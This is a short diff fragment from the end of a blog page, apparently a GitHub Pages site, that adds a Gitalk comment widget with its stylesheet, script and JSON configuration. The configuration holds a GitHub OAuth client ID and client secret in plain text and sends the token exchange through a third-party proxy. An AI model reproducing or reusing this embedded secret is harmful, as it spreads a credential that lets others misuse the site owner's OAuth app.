+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"godrun666","repo":"godrun666.github.io","client_id":"7f8a0f5a5c88a0fea952","client_secret":"57250fa3a3b4cb1d0e0dad43bb1fffe7355d61a8","admin_user":"godrun666","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":null,"js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"a371063e36b57e0dd713794a3df73a58"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
